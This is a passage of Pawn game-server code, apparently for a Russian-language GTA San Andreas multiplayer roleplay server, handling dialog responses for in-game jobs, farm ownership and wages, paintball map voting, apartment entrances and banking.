			SendClientMessage(playerid, C_BLUE, "Для покупки обратитесь к владельцу проекта - vk.com/cromulent_online");
		}
	}
	case DIALOG_PAINTBALL_SELECT_MAP:
	{
		if(response)
		{
			g_paintball_info[PB_VOTE][listitem] ++;

			STRING_GLOBAL[0] = EOS;
			format(STRING_GLOBAL, sizeof STRING_GLOBAL, "Вы успешно проголосовали за карту %s", g_paintball_map_name[listitem]);
			SendClientMessage(playerid, C_BLUE, STRING_GLOBAL);
		}
	}
	case DIALOG_LISTENING:
	{
		if(response)
		{
			if(PI[playerid][pMember] != TEAM_FBI)
				return SendMess(playerid, MSG_YOU_CAN_NOT);

			if(PI[playerid][pRank] < 5)
				return SendMess(playerid, MSG_YOU_CAN_NOT);

			PI[playerid][P_LISTETING] = org_list[listitem][0];

			STRING_GLOBAL[0] = EOS;
			format(STRING_GLOBAL, sizeof STRING_GLOBAL, "Вы начали прослушивание организации %s", g_organization[listitem]);
			SendClientMessage(playerid, C_BLUE, STRING_GLOBAL);

		}
	}
	case DIALOG_START_JOB_MINER:
	{
		if(response)
		{
			if(PI[playerid][P_JOB] == JOB_NONE)
			{
				if(IsPlayerAttachedObjectSlotUsed(playerid,1))
					RemovePlayerAttachedObject(playerid,1);

				pPressed[playerid] = 0;
				PI[playerid][P_JOB] = JOB_MINER;
				SetPlayerSkin(playerid, 260);
				SetPlayerAttachedObject(playerid, 1, 18634, 6, 0.075000,0.002999,0.154000, 98.399978,-69.600013,1.100000);
				SetPVarInt(playerid, "relate", 0);

				SendClientMessage(playerid, C_CROM, "Вы начали работу шахтёра");
				SendClientMessage(playerid, C_CROM, "Следуйте в шахту к месту добычи сырья");
				SendClientMessage(playerid, C_CROM, "Добытое сырьё относите к вагону");
				SendClientMessage(playerid, C_CROM, "Если Вы уйдёте далеко от места работы, то будете уволены");
	            SendClientMessage(playerid, C_CROM, "{ffac00}Используйте {e37400}ЛКМ {ffac00}для начала работы");

				ClearAnimations(playerid);
			}
			else if(PI[playerid][P_JOB] == JOB_MINER)
			{
				if(!doubling_donate)
				{
					STRING_GLOBAL[0] = EOS;
					format(STRING_GLOBAL, sizeof(STRING_GLOBAL), "Рабочий день завершён. Вы добыли: {FF9900}%d кг {37c268}руды",pPressed[playerid]);
					SendClientMessage(playerid, C_CROM, STRING_GLOBAL);

					format(STRING_GLOBAL, sizeof(STRING_GLOBAL), "Заработано {FF9900}%d {37c268}рублей.",pPressed[playerid]*7);
					SendClientMessage(playerid, C_CROM, STRING_GLOBAL);

					format(STRING_GLOBAL, sizeof(STRING_GLOBAL), "~g~+%i RUB",pPressed[playerid]*7);
					GameTextForPlayer(playerid, STRING_GLOBAL, 5000, 1);

					GiveMoney(playerid, pPressed[playerid]*7);
				}
				else
				{
					STRING_GLOBAL[0] = EOS;
					format(STRING_GLOBAL, sizeof(STRING_GLOBAL), "Рабочий день завершён. Вы добыли: {FF9900}%d кг {37c268}руды",pPressed[playerid]);
					SendClientMessage(playerid, C_CROM, STRING_GLOBAL);

				    format(STRING_GLOBAL, sizeof(STRING_GLOBAL), "Заработано {FF9900}%d {37c268}рублей. (C учетом Х2)",pPressed[playerid]*11);
					SendClientMessage(playerid, C_CROM, STRING_GLOBAL);

					format(STRING_GLOBAL, sizeof(STRING_GLOBAL), "~g~+%i RUB",pPressed[playerid]*11);
					GameTextForPlayer(playerid, STRING_GLOBAL, 5000, 1);

					GiveMoney(playerid, pPressed[playerid]*11);
				}

	   			RemovePlayerAttachedObject(playerid,1);
			   	RemovePlayerAttachedObject(playerid,2);// забрали тачку
			   	RemovePlayerAttachedObject(playerid,3);// забрали тачку

				if(PI[playerid][pMember]) SetPlayerSkin(playerid, PI[playerid][pMemberSkin]);
				else SetPlayerSkin(playerid, PI[playerid][pModel]);

				DisablePlayerCheckpoint(playerid);
				PI[playerid][P_JOB] = JOB_NONE;
				pPressed[playerid] = 0;
				SetPVarInt(playerid, "relate", 0);
			}
		}
	}
	case DIALOG_GRUZ:
	{
		if(response)
	    {
            if(PI[playerid][P_JOB] == JOB_NONE)
          	{
                if(PI[playerid][P_JOB] > JOB_NONE) return SendClientMessage(playerid, COLOR_GREY, "Вы уже работаете где-то");
				pPressed[playerid] = 0;
			 	PI[playerid][P_JOB] = JOB_GRUZ_WOOD;
				if(PI[playerid][pSex] == 1){
				SetPlayerSkin(playerid,16);
				}
				else
				{
					SetPlayerSkin(playerid,168);
				}
                SetPlayerCheckpoint(playerid,907.0281,473.4711,12.0054,2.0);
				SendClientMessage(playerid, C_WHITE, "{37c268}Вы начали рабочий день. Следуйте в ангар!");
			}
			else if(PI[playerid][P_JOB] == JOB_GRUZ_WOOD)
	        {
				if(PI[playerid][pMember]) SetPlayerSkin(playerid, PI[playerid][pMemberSkin]);
				else SetPlayerSkin(playerid, PI[playerid][pModel]);

				if(!doubling_donate)
				{
				    new money = pPressed[playerid]*5;

					STRING_GLOBAL[0] = EOS;
					format(STRING_GLOBAL, sizeof STRING_GLOBAL, "{e0c600}Вы закончили рабочий день, Ваш заработок: %iр",money);
					SendClientMessage(playerid, COLOR_WHITE, STRING_GLOBAL);

					STRING_GLOBAL[0] = EOS;
					format(STRING_GLOBAL, sizeof(STRING_GLOBAL), "~g~+%dр", money);
					GameTextForPlayer(playerid,STRING_GLOBAL,3000,1);

					GiveMoney(playerid, money);
				}
				else
				{
				    new money = pPressed[playerid]*9;

					STRING_GLOBAL[0] = EOS;
					format(STRING_GLOBAL, sizeof STRING_GLOBAL, "{e0c600}Вы закончили рабочий день, Ваш заработок: %iр (С учетом Х2)",money);
					SendClientMessage(playerid, COLOR_WHITE, STRING_GLOBAL);

					STRING_GLOBAL[0] = EOS;
					format(STRING_GLOBAL, sizeof(STRING_GLOBAL), "~g~+%dр", money);
					GameTextForPlayer(playerid,STRING_GLOBAL,3000,1);

					GiveMoney(playerid, money);
				}

				if(IsPlayerAttachedObjectSlotUsed(playerid, 4))
					RemovePlayerAttachedObject(playerid, 4);

				DisablePlayerCheckpoint(playerid);
				PI[playerid][P_JOB] = JOB_NONE;
				pPressed[playerid] = 0;
			}
       	}
    }
	case DIALOG_START_JOB_LOGGER:
	{
		if(response)
	    {
          	if(PI[playerid][P_JOB] == JOB_NONE)
          	{
                if(PI[playerid][P_JOB] > JOB_NONE) return SendClientMessage(playerid, COLOR_GREY, "Вы уже работаете где-то");
				pPressed[playerid] = 0;
			 	PI[playerid][P_JOB] = JOB_LOGGER;
				if(PI[playerid][pSex] == 1){
				SetPlayerSkin(playerid,16);
				}
				else
				{
					SetPlayerSkin(playerid,75);
				}
				SetPlayerAttachedObject(playerid, 3, 341, 6, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000);
				SendClientMessage(playerid, C_WHITE, "{37c268}Вы начали рабочий день. Следуйте в лес!");
				SendClientMessage(playerid, C_WHITE, "{37c268}Для начала работы подойдите к дереву и используйте {e8b800}ЛКМ");
			}
			else if(PI[playerid][P_JOB] == JOB_LOGGER)
	        {
				if(PI[playerid][pMember]) SetPlayerSkin(playerid, PI[playerid][pMemberSkin]);
				else SetPlayerSkin(playerid, PI[playerid][pModel]);

				if(!doubling_donate)
				{
		            new money = pPressed[playerid]*4;
					STRING_GLOBAL[0] = EOS;
					format(STRING_GLOBAL, sizeof STRING_GLOBAL, "{e0c600}Вы закончили рабочий день, Ваш заработок: %iр",money);
					SendClientMessage(playerid, COLOR_WHITE, STRING_GLOBAL);

					STRING_GLOBAL[0] = EOS;
					format(STRING_GLOBAL, sizeof(STRING_GLOBAL), "~g~+%dр", money);
					GameTextForPlayer(playerid,STRING_GLOBAL,3000,1);

					GiveMoney(playerid, money);
				}
				else
				{
		            new money = pPressed[playerid]*8;
					STRING_GLOBAL[0] = EOS;
					format(STRING_GLOBAL, sizeof STRING_GLOBAL, "{e0c600}Вы закончили рабочий день, Ваш заработок: %iр (С учетом Х2)",money);
					SendClientMessage(playerid, COLOR_WHITE, STRING_GLOBAL);

					STRING_GLOBAL[0] = EOS;
					format(STRING_GLOBAL, sizeof(STRING_GLOBAL), "~g~+%dр", money);
					GameTextForPlayer(playerid,STRING_GLOBAL,3000,1);

					GiveMoney(playerid, money);
				}

				if(IsPlayerAttachedObjectSlotUsed(playerid, 3))
					RemovePlayerAttachedObject(playerid, 3);

				if(IsPlayerAttachedObjectSlotUsed(playerid, 4))
					RemovePlayerAttachedObject(playerid, 4);

				DisablePlayerCheckpoint(playerid);
				PI[playerid][P_JOB] = JOB_NONE;
				pPressed[playerid] = 0;
				SetPVarInt(playerid, "LessStatus", 0);
			}
       	}
    }
   	case DIALOG_START_JOB_FARMER:
	{
		if(response)
		{
			switch(listitem+1)
			{
			    case 1:
			    {
				    if(g_ferm_info[F_BANK] < 150000) return SendClientMessage(playerid, COLOR_BLUE, "Ферма сейчас не может оплатить зарплату. Приходите попозже");
					pPressed[playerid] = 0;
					PI[playerid][P_JOB] = JOB_FARMER;
					SetPlayerSkin(playerid, 159);
					g_ferm_info[F_VISITORS] ++;

					SetPVarInt(playerid, "relate", 0);

					SendClientMessage(playerid, COLOR_BLUE, "Вы начали работу фермера");
					SendClientMessage(playerid, COLOR_YELLOW, "Местонахождение сена отмечено на карте красным чекпоинтом.");
					SendClientMessage(playerid, COLOR_YELLOW, "Собранное сено относите на склад.");
					SendClientMessage(playerid, COLOR_YELLOW, "Если Вы уйдёте далеко от места работы, то Ваша зарплата анулируется.");

					new idx = random(sizeof coord_checkpoint_farmer);

					SetPlayerCheckpoint(playerid, coord_checkpoint_farmer[idx][0], coord_checkpoint_farmer[idx][1], coord_checkpoint_farmer[idx][2]-1.0, 2.0);

					ClearAnimations(playerid);
				}
				case 2:
				{

				}
				case 3:
				{

				}
				case 4:
				{

				}
				case 5:
				{

					new fmt_str[70];

					STRING_GLOBAL[0] = EOS;
					format(fmt_str, sizeof fmt_str, "Зарплата на сборе урожая{FFCC00}%d рублей\n", GetFermData(F_PAYSENO));
					strcat(STRING_GLOBAL, fmt_str);

					format(fmt_str, sizeof fmt_str, "Зарплата на работе комбайнера{FFCC00}%d рублей\n", GetFermData(F_PAYCOMB));
					strcat(STRING_GLOBAL, fmt_str);

					format(fmt_str, sizeof fmt_str, "Зарплата на работе тракториста {FFCC00}%d рублей", GetFermData(F_PAYTRAK));
					strcat(STRING_GLOBAL, fmt_str);

					format(fmt_str, sizeof fmt_str, "Зарплата на перевозке чая {FFCC00}%d рублей", GetFermData(F_PAYTRUC));
					strcat(STRING_GLOBAL, fmt_str);

					ShowPlayerDialog
					(
						playerid, 0, DIALOG_STYLE_MSGBOX,
						"{FFCC00}Оплата труда",
						STRING_GLOBAL,
						"Закрыть", ""
					);
				}
			}
		}
	}
	case DIALOG_END_JOB_FARMER:
	{
		if(response)
		{
			switch(PI[playerid][P_JOB])
			{
				case JOB_FARMER:
				{
					if(PI[playerid][pMember]) SetPlayerSkin(playerid, PI[playerid][pMemberSkin]);
					else SetPlayerSkin(playerid, PI[playerid][pModel]);

					if(!doubling_donate)
					{
			            new money = pPressed[playerid]*GetFermData(F_PAYSENO);
						STRING_GLOBAL[0] = EOS;
						format(STRING_GLOBAL, sizeof STRING_GLOBAL, "{e0c600}Вы закончили рабочий день, Ваш заработок: %iр",money);
						SendClientMessage(playerid, COLOR_WHITE, STRING_GLOBAL);

						STRING_GLOBAL[0] = EOS;
						format(STRING_GLOBAL, sizeof(STRING_GLOBAL), "~g~+%dр", money);
						GameTextForPlayer(playerid,STRING_GLOBAL,3000,1);

	                    g_ferm_info[F_BANK] -= money;

						GiveMoney(playerid, money);
					}
					else
					{
			            new money = pPressed[playerid]*GetFermData(F_PAYSENO)*2;
						STRING_GLOBAL[0] = EOS;
						format(STRING_GLOBAL, sizeof STRING_GLOBAL, "{e0c600}Вы закончили рабочий день, Ваш заработок: %iр (С учетом Х2)",money);
						SendClientMessage(playerid, COLOR_WHITE, STRING_GLOBAL);

						STRING_GLOBAL[0] = EOS;
						format(STRING_GLOBAL, sizeof(STRING_GLOBAL), "~g~+%dр", money);
						GameTextForPlayer(playerid,STRING_GLOBAL,3000,1);

	                    g_ferm_info[F_BANK] -= money / 2;

						GiveMoney(playerid, money);
					}

					if(IsPlayerAttachedObjectSlotUsed(playerid, 3))
						RemovePlayerAttachedObject(playerid, 3);

					if(IsPlayerAttachedObjectSlotUsed(playerid, 4))
						RemovePlayerAttachedObject(playerid, 4);

					DisablePlayerCheckpoint(playerid);
					PI[playerid][P_JOB] = JOB_NONE;
					pPressed[playerid] = 0;
				}
			}
		}
	}
	case DIALOG_START_JOB_GUN_COLLECTOR:
	{
		if(response)
		{
			pPressed[playerid] = 0;
			PI[playerid][P_JOB] = JOB_GUN_COLLECTOR;
			SetPlayerSkin(playerid, 258);

			SetPVarInt(playerid, "relate", 0);

			SendClientMessage(playerid, COLOR_BLUE, "Вы начали работу сборщика оружия");
			SendClientMessage(playerid, COLOR_YELLOW, "Местонахождение станка отмечено на карте красным чекпоинтом.");
			SendClientMessage(playerid, COLOR_YELLOW, "Собранное оружие относите на склад.");
			SendClientMessage(playerid, COLOR_YELLOW, "Если Вы уйдёте далеко от места работы, то Ваша зарплата анулируется.");

			new idx = random(sizeof coord_checkpoint_gun_collector);

			SetPlayerCheckpoint(playerid, coord_checkpoint_gun_collector[idx][0], coord_checkpoint_gun_collector[idx][1], coord_checkpoint_gun_collector[idx][2]-1.0, 2.0);

			ClearAnimations(playerid);
		}
	}
	case DIALOG_FERM_MENU:
	{
		if(response)
		{
			switch(listitem)
			{
				case 0:
				{
					new owner[MAX_PLAYER_NAME],
						sub[MAX_PLAYER_NAME];

					owner = "{FFCC00}Отсутствует",
					sub = "{FFCC00}Отсутствует";

					if(strcmp(g_ferm_info[F_OWNER], "None")) format(owner, sizeof owner, "{ff614a}%s", GetFermData(F_OWNER));
					if(strcmp(g_ferm_info[F_SUB], "None")) format(sub, sizeof sub, "{ff614a}%s", GetFermData(F_SUB));

					new fmt_str[70];

					STRING_GLOBAL[0] = EOS;
					format(fmt_str, sizeof fmt_str, "{FFFFFF}Владелец: {FFCC00}%s\n", owner);
					strcat(STRING_GLOBAL, fmt_str);

					format(fmt_str, sizeof fmt_str, "{FFFFFF}Заместитель: {FFCC00}%s\n", sub);
					strcat(STRING_GLOBAL, fmt_str);

					format(fmt_str, sizeof fmt_str, "{FFFFFF}Статус %s\n", GetFermData(F_LOCK) == 1 ? "{66cc00}Открыть" : "{ff614a}Закрыть");
					strcat(STRING_GLOBAL, fmt_str);

					format(fmt_str, sizeof fmt_str, "{FFFFFF}Баланс фермы: {FFCC00}%d рублей\n", GetFermData(F_BANK));
					strcat(STRING_GLOBAL, fmt_str);

					format(fmt_str, sizeof fmt_str, "{FFFFFF}Стоимость: {FFCC00}%d рублей\n", GetFermData(F_COST));
					strcat(STRING_GLOBAL, fmt_str);

					format(fmt_str, sizeof fmt_str, "{FFFFFF}Оплачено дней: {FFCC00}%d/30\n", GetFermData(F_PAY));
					strcat(STRING_GLOBAL, fmt_str);

					format(fmt_str, sizeof fmt_str, "{FFFFFF}Рабочих за 24 часа: {FFCC00}%d\n", GetFermData(F_VISITORS));
					strcat(STRING_GLOBAL, fmt_str);

					format(fmt_str, sizeof fmt_str, "{FFFFFF}Прибыль за 24 часа: {FFCC00}%d рублей", GetFermData(F_PROFIT));
					strcat(STRING_GLOBAL, fmt_str);

					ShowPlayerDialog
					(
						playerid, 0, DIALOG_STYLE_MSGBOX,
						"{FFCC00}Статистика фермы",
						STRING_GLOBAL,
						"Закрыть", ""
					);
				}
				case 1:
				{
					if(g_ferm_info[F_LOCK] == 0) g_ferm_info[F_LOCK] = 1;
					else g_ferm_info[F_LOCK] = 0;

					STRING_GLOBAL[0] = EOS;
					format(STRING_GLOBAL, sizeof STRING_GLOBAL, "Вы %s ферму", GetFermData(F_LOCK) == 0 ? ("открыли") : ("закрыли"));
					SendClientMessage(playerid, C_BLUE, STRING_GLOBAL);

					STRING_GLOBAL[0] = EOS;
					format(STRING_GLOBAL, sizeof STRING_GLOBAL, "UPDATE ferm SET lock=%d", GetFermData(F_LOCK));
					mysql_query(dbHandle, STRING_GLOBAL);

					UpdateFermLabel();
				}
				case 2:
				{

				}
				case 3:
				{
					STRING_GLOBAL[0] = EOS;
					format
					(
						STRING_GLOBAL, sizeof STRING_GLOBAL,
						"{FFFFFF}Зарплата за переноску сена: {FFCC00}%d рублей(за 1 переноску)\n"\
						"{FFFFFF}Зарплата на комбайне: {FFCC00}%d рублей(За 1 чекпоинт)\n"\
						"{FFFFFF}Зарплата на тракторе: {FFCC00}%d рублей(За 1 чекпоинт)\n"\
						"{FFFFFF}Зарплата перевозчику зерна: {FFCC00}%d рублей (За 1 рейс)",
						GetFermData(F_PAYSENO),
						GetFermData(F_PAYCOMB),
						GetFermData(F_PAYTRAK),
						GetFermData(F_PAYTRUC)
					);

					ShowPlayerDialog
					(
						playerid, DIALOG_FERM_MENU_ZP, DIALOG_STYLE_LIST,
						"{FFCC00}Список зарплат",
						STRING_GLOBAL,
						"Редактировать", "Отмена"
					);

				}
				case 4:
				{
					if(strcmp(GetFermData(F_OWNER), GetName(playerid)) && strcmp(GetFermData(F_SUB), GetName(playerid)))
						return 1;

					ShowPlayerDialog
					(
						playerid, DIALOG_FERM_TAKE_MONEY, DIALOG_STYLE_INPUT,
						"{FFCC00}Снять прибыль",
						"{FFFFFF}Введите количество денег, которое хотите снять с баланса фермы:",
						"Снять", "Отмена"
					);
				}
				case 5:
				{
					if(strcmp(GetFermData(F_OWNER), GetName(playerid)) && strcmp(GetFermData(F_SUB), GetName(playerid)))
						return 1;

					ShowPlayerDialog
					(
						playerid, DIALOG_FERM_GIVE_MONEY, DIALOG_STYLE_INPUT,
						"{FFCC00}Пополнение баланса",
						"{FFFFFF}Введите количество денег, которое вы хотите внести на счет фермы:",
						"Снять", "Отмена"
					);
				}
				case 6:
				{
					if(!strcmp(GetFermData(F_OWNER), GetName(playerid)))
					{
						ShowPlayerDialog
						(
							playerid, DIALOG_FERM_SELL, DIALOG_STYLE_MSGBOX,
							"{FFCC00}Продажа фермы",
							"{FFFFFF}Вы действительно хотите продать ферму?\nВам вернется половина цены от стоимости фермы",
							"Да", "Нет"
						);
					}
					else if(!strcmp(GetFermData(F_SUB), GetName(playerid)))
					{
						ShowPlayerDialog
						(
							playerid, DIALOG_FERM_SUB_LEAVE, DIALOG_STYLE_MSGBOX,
							"{FFCC00}Покинуть пост заместителя",
							"{FFFFFF}Вы действительно хотите покинуть пост заместителя фермы?",
							"Да", "Нет"
						);
					}
				}
			}
		}
	}
	case DIALOG_FERM_MENU_ZP:
	{
		if(response)
		{
			switch(listitem)
			{
				case 0:
				{
					ShowPlayerDialog
					(
						playerid, DIALOG_SENO_ZP, DIALOG_STYLE_INPUT,
						"{FFCC00}Изменение зарплаты",
						"{FFFFFF}Введите оплату за 1 переноску сена (от 130 до 1000р):",
						"Снять", "Отмена"
					);
				}
				case 1:
				{
					ShowPlayerDialog
					(
						playerid, DIALOG_COMB_ZP, DIALOG_STYLE_INPUT,
						"{FFCC00}Изменение зарплаты",
						"{FFFFFF}Введите оплату за 1 чекпоинт на работе комбайна (от 100 до 1500р):",
						"Снять", "Отмена"
					);
				}
				case 2:
				{
					ShowPlayerDialog
					(
						playerid, DIALOG_TRUK_ZP+10, DIALOG_STYLE_INPUT,
						"{FFCC00}Изменение зарплаты",
						"{FFFFFF}Введите оплату за 1 чекпоинт на работе трактора (от 100 до 1500р):",
						"Снять", "Отмена"
					);
				}
				case 3:
				{
					ShowPlayerDialog
					(
						playerid, DIALOG_TRAC_ZP+5, DIALOG_STYLE_INPUT,
						"{FFCC00}Изменение зарплаты",
						"{FFFFFF}Введите оплату за 1 рейс при перевозке (от 5000 до 15000р):",
						"Снять", "Отмена"
					);
				}
			}
		}
	}
	case DIALOG_TRAC_ZP+5:
	{
		if(response)
		{
			new zp_sum = strval(inputtext);
			if(zp_sum > 0 && IsNumeric(inputtext))
			{
				if(!(5000 <= zp_sum <= 15000)) return SendClientMessage(playerid, C_RED, "Минимальная зарплата 5000р, максимальная 15000р");

                g_ferm_info[F_PAYTRUC] = zp_sum;

				STRING_GLOBAL[0] = EOS;
				format(STRING_GLOBAL, sizeof STRING_GLOBAL, "UPDATE ferm SET PayTruc=%d", GetFermData(F_PAYTRUC));
				mysql_query(dbHandle, STRING_GLOBAL);

				STRING_GLOBAL[0] = EOS;
				format(STRING_GLOBAL, sizeof STRING_GLOBAL, "Вы успешно установили оплату %d рублей на перевозке сена", zp_sum);
				SendClientMessage(playerid, C_BLUE, STRING_GLOBAL);
				SendClientMessage(playerid, C_BLUE, "Если в банке фермы оствутвуют деньги для оплаты труда, она будет недоступна");
			}
		}
	}
	case DIALOG_TRUK_ZP+10:
	{
		if(response)
		{
			new zp_sum = strval(inputtext);
			if(zp_sum > 0 && IsNumeric(inputtext))
			{
				if(!(100 <= zp_sum <= 1500)) return SendClientMessage(playerid, C_RED, "Минимальная зарплата 100р, максимальная 1500р");

                g_ferm_info[F_PAYTRAK] = zp_sum;

				STRING_GLOBAL[0] = EOS;
				format(STRING_GLOBAL, sizeof STRING_GLOBAL, "UPDATE ferm SET PayTrak=%d", GetFermData(F_PAYTRAK));
				mysql_query(dbHandle, STRING_GLOBAL);

				STRING_GLOBAL[0] = EOS;
				format(STRING_GLOBAL, sizeof STRING_GLOBAL, "Вы успешно установили оплату %d рублей на работе тракториста", zp_sum);
				SendClientMessage(playerid, C_BLUE, STRING_GLOBAL);
				SendClientMessage(playerid, C_BLUE, "Если в банке фермы оствутвуют деньги для оплаты труда, она будет недоступна.");
			}
		}
	}
	case DIALOG_COMB_ZP:
	{
		if(response)
		{
			new zp_sum = strval(inputtext);
			if(zp_sum > 0 && IsNumeric(inputtext))
			{
				if(!(100 <= zp_sum <= 1500)) return SendClientMessage(playerid, C_RED, "Минимальная зарплата 100р, максимальная 1500р");

                g_ferm_info[F_PAYCOMB] = zp_sum;

				STRING_GLOBAL[0] = EOS;
				format(STRING_GLOBAL, sizeof STRING_GLOBAL, "UPDATE ferm SET PayComb=%d", GetFermData(F_PAYCOMB));
				mysql_query(dbHandle, STRING_GLOBAL);

				STRING_GLOBAL[0] = EOS;
				format(STRING_GLOBAL, sizeof STRING_GLOBAL, "Вы успешно установили оплату %d рублей на работе комбайна", zp_sum);
				SendClientMessage(playerid, C_BLUE, STRING_GLOBAL);
				SendClientMessage(playerid, C_BLUE, "Если в банке фермы оствутвуют деньги для оплаты труда, она будет недоступна.");
			}
		}
	}
	case DIALOG_SENO_ZP:
	{
		if(response)
		{
			new zp_sum = strval(inputtext);
			if(zp_sum > 0 && IsNumeric(inputtext))
			{
				if(!(130 <= zp_sum <= 1000)) return SendClientMessage(playerid, C_RED, "Минимальная зарплата 130р, максимальная 1000р");

                g_ferm_info[F_PAYSENO] = zp_sum;

				STRING_GLOBAL[0] = EOS;
				format(STRING_GLOBAL, sizeof STRING_GLOBAL, "UPDATE ferm SET PaySeno=%d", GetFermData(F_PAYSENO));
				mysql_query(dbHandle, STRING_GLOBAL);

				STRING_GLOBAL[0] = EOS;
				format(STRING_GLOBAL, sizeof STRING_GLOBAL, "Вы успешно установили оплату %d рублей на работе сбора сена", zp_sum);
				SendClientMessage(playerid, C_BLUE, STRING_GLOBAL);
				SendClientMessage(playerid, C_BLUE, "Если в банке фермы оствутвуют деньги для оплаты труда, она будет недоступна.");
			}
		}
	}
	case DIALOG_FERM_SELL:
	{
		if(response)
		{
			if(!strcmp(GetFermData(F_OWNER), GetName(playerid)))
			{
				g_ferm_info[F_OWNER] = EOS;
				strcat(g_ferm_info[F_OWNER], "None");

				g_ferm_info[F_SUB] = EOS;
				strcat(g_ferm_info[F_SUB], "None");

				mysql_query(dbHandle, "UPDATE ferm SET owner='None', sub='None'");

				GiveMoney(playerid, g_ferm_info[F_COST]/2);

				UpdateFermLabel();

				SendClientMessage(playerid, C_BLUE, "Вы успешно продали ферму");
			}
		}
	}
	case DIALOG_FERM_SUB_LEAVE:
	{
		if(response)
		{
			if(!strcmp(GetFermData(F_SUB), GetName(playerid)))
			{
				g_ferm_info[F_SUB] = EOS;
				strcat(g_ferm_info[F_SUB], "None");

				mysql_query(dbHandle, "UPDATE ferm SET sub='None'");

				UpdateFermLabel();

				SendClientMessage(playerid, C_BLUE, "Вы успешно покинуть пост заместителя фермы");
			}
		}
	}
	case DIALOG_FERM_GIVE_MONEY:
	{
		if(response)
		{
			new give_sum = strval(inputtext);
			if(give_sum > 0 && IsNumeric(inputtext))
			{
				if(PI[playerid][pCash] < give_sum)
					return SendClientMessage(playerid, C_RED, "У вас недостаточно денег на руках");

				g_ferm_info[F_BANK] += give_sum;

				GiveMoney(playerid, -give_sum, "Пополнение Ферма");

				STRING_GLOBAL[0] = EOS;
				format(STRING_GLOBAL, sizeof STRING_GLOBAL, "UPDATE ferm SET bank=%d", GetFermData(F_BANK));
				mysql_query(dbHandle, STRING_GLOBAL);

				STRING_GLOBAL[0] = EOS;
				format(STRING_GLOBAL, sizeof STRING_GLOBAL, "Вы успешно положили %d рублей на счет фермы", give_sum);
				SendClientMessage(playerid, C_BLUE, STRING_GLOBAL);
			}
		}
	}
	case DIALOG_FERM_TAKE_MONEY:
	{
		if(response)
		{
			new take_sum = strval(inputtext);
			if(take_sum > 0 && IsNumeric(inputtext))
			{
				if(GetFermData(F_BANK) < take_sum)
					return SendClientMessage(playerid, C_RED, "На счету фермы недостаточно денег");

				g_ferm_info[F_BANK] -= take_sum;

				GiveMoney(playerid, take_sum, "Ферма");

				STRING_GLOBAL[0] = EOS;
				format(STRING_GLOBAL, sizeof STRING_GLOBAL, "UPDATE ferm SET bank=%d", GetFermData(F_BANK));
				mysql_query(dbHandle, STRING_GLOBAL);

				STRING_GLOBAL[0] = EOS;
				format(STRING_GLOBAL, sizeof STRING_GLOBAL, "Вы успешно сняли %d рублей со счета фермы", take_sum);
				SendClientMessage(playerid, C_BLUE, STRING_GLOBAL);
			}
		}
	}
	case DIALOG_END_JOB:
	{
		if(response)
		{
			new job = PI[playerid][P_JOB];

			if(job == 0)
				return 1;

			switch(job)
			{
				case JOB_GUN_COLLECTOR:
				{
					new money = pPressed[playerid]*400;

					if(PI[playerid][pMember]) SetPlayerSkin(playerid, PI[playerid][pMemberSkin]);
					else SetPlayerSkin(playerid, PI[playerid][pModel]);

					STRING_GLOBAL[0] = EOS;
					format(STRING_GLOBAL, sizeof STRING_GLOBAL, "Вы закончили рабочий день, Ваш заработок: %iр",money);
					SendClientMessage(playerid, COLOR_BLUE, STRING_GLOBAL);

					STRING_GLOBAL[0] = EOS;
					format(STRING_GLOBAL, sizeof(STRING_GLOBAL), "~g~+%dр", money);
					GameTextForPlayer(playerid,STRING_GLOBAL,3000,1);

					GiveMoney(playerid, money);

					if(IsPlayerAttachedObjectSlotUsed(playerid, 2))
						RemovePlayerAttachedObject(playerid, 2);

					if(IsPlayerAttachedObjectSlotUsed(playerid, 3))
						RemovePlayerAttachedObject(playerid, 3);

					DisablePlayerCheckpoint(playerid);
					PI[playerid][P_JOB] = 0;
					pPressed[playerid] = 0;
					SetPVarInt(playerid, "relate", 0);
				}
			}
		}
	}
	case DIALOG_CREATE_ENTRANCE:
	{
		if(response)
		{
			new sum = strval(inputtext);

			if(!(1 <= sum <= 1000000))
			{
				SendClientMessage(playerid, C_RED, "Стоимость квартиры должна быть в диапазоне от 1 по 1000000 рублей");

				return ShowPlayerDialog(playerid, DIALOG_CREATE_ENTRANCE, DIALOG_STYLE_INPUT, "Добавить подъезд", "Вы должны стоять на входе будущий подъезд!\nВведите стоимость квартир:", "Далее", "Отмена");
			}

			new entranceid = ++ TOTALENTRANCE;

			GetPlayerPos(playerid, g_entrance[entranceid][POS_X], g_entrance[entranceid][POS_Y], g_entrance[entranceid][POS_Z]);

			SetEntranceData(entranceid, E_PRICE_ROOM, sum);
			SetEntranceData(entranceid, E_PICKUP, CreateDynamicPickup(1318, 23, GetEntranceData(entranceid, POS_X), GetEntranceData(entranceid, POS_Y), GetEntranceData(entranceid, POS_Z), -1, -1));
			SetEntranceData(entranceid, E_AREA_ENTER, CreateDynamicSphere(GetEntranceData(entranceid, POS_X), GetEntranceData(entranceid, POS_Y), GetEntranceData(entranceid, POS_Z), 1.0));

			STRING_GLOBAL[0] = EOS;
			format(STRING_GLOBAL, sizeof STRING_GLOBAL, "INSERT INTO entrances (pos_x, pos_y, pos_z, room_price) VALUES ('%f', '%f', '%f', '%d')", GetEntranceData(entranceid, POS_X), GetEntranceData(entranceid, POS_Y), GetEntranceData(entranceid, POS_Z), GetEntranceData(entranceid, E_PRICE_ROOM));
			mysql_query(dbHandle, STRING_GLOBAL);

			for(new i; i < MAX_ROOMS; i ++)
			{
				STRING_GLOBAL[0] = EOS;
				format(STRING_GLOBAL, sizeof STRING_GLOBAL, "INSERT INTO rooms (entranceid) VALUES ('%d')", entranceid-1);
				mysql_query(dbHandle, STRING_GLOBAL);
			}

			STRING_GLOBAL[0] = EOS;
			format(STRING_GLOBAL, sizeof STRING_GLOBAL, "Вы успешно создали подъезд №%d. Теперь установите координаты выхода (/entrance_exit)", TOTALENTRANCE);
			SendClientMessage(playerid, C_BLUE, STRING_GLOBAL);

		}
	}

	case DIALOG_BANK_SELECT_SUM:
	{
		if(response)
		{
			new sum = strval(inputtext);
			if(sum > 0 && IsNumeric(inputtext))
			{
				if(player_select_other_sum[playerid])
				{
					if(PI[playerid][pBank] >= sum)
					{
						if(GetMoney(playerid) + sum > 1000000000)
							return SendClientMessage(playerid, C_RED, "На руках запрещено иметь более 1000000000 рублей");

						STRING_GLOBAL[0] = EOS;
